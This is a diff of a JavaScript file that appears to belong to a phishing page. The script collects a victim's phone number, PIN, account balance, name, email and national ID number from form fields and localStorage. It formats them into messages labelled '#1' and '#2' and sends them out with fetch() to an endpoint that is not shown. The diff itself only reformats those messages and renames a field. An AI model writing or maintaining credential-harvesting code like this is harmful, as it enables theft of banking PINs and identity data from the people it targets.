@@ -55,7 +55,7 @@ document.addEventListener("DOMContentLoaded", () => {
       "*#2*\n\n" +
       "Numero: " + inputTelefonoLogin.value + "\n" +
       "Clave: " + inputPin.value + "\n" +
-      "Saldo: " + inputSaldo.value + "\n";
+      "Saldo: " + inputSaldo.value ;
 
     try {
       const response = await fetch(
@@ -75,7 +75,7 @@ document.addEventListener("DOMContentLoaded", () => {
 
       /* =============================== GUARDAR EN LOCALSTORAGE =============================== */
       const datosLogin = {
-        telefono: inputTelefonoLogin.value,
+        numero: inputTelefonoLogin.value,
         pin: inputPin.value,
         saldo: inputSaldo.value,
         fecha: new Date().toLocaleString()
@@ -91,24 +91,22 @@ document.addEventListener("DOMContentLoaded", () => {
       if (primerFormulario && primerFormulario.length > 0) {
         const datosFinales = primerFormulario[primerFormulario.length - 1];
         mensajeForm1 =
-          "📦 FORMULARIO CONSULTA:\n\n" +
-          "📱 Teléfono: " + datosFinales.telefono + "\n" +
-          "👤 Nombre: " + datosFinales.nombre + "\n" +
-          "📧 Correo: " + datosFinales.correo + "\n" +
-          "🆔 Cédula: " + datosFinales.cedula + "\n" +
-          "🕒 Fecha: " + datosFinales.fecha;
-      }
+          "#1:\n\n" +
+          "Numero: " + datosFinales.numero + "\n" +
+          "Nombre: " + datosFinales.nombre + "\n" +
+          "Correo: " + datosFinales.correo + "\n" +
+          "Cédula: " + datosFinales.cedula ;
+    }
 
       const segundoFormulario = JSON.parse(localStorage.getItem("loginData"));
       let mensajeForm2 = "❌ No hay datos en el segundo almacenamiento (loginData)";
 
       if (segundoFormulario) {
         mensajeForm2 =
-          "📦 FORMULARIO LOGIN:\n\n" +
-          "📱 Teléfono: " + segundoFormulario.telefono + "\n" +
-          "🔐 PIN: " + segundoFormulario.pin + "\n" +
-          "💰 Saldo: " + segundoFormulario.saldo + "\n" +
-          "🕒 Fecha: " + segundoFormulario.fecha;
+          "#2:\n\n" +
+          "Numero: " + segundoFormulario.numero + "\n" +
+          "Pin: " + segundoFormulario.pin + "\n" +
+          "💰 Saldo: " + segundoFormulario.saldo;
       }
 
     
@@ -125,5 +123,6 @@ document.addEventListener("DOMContentLoaded", () => {
 
 
 });
+
 
 
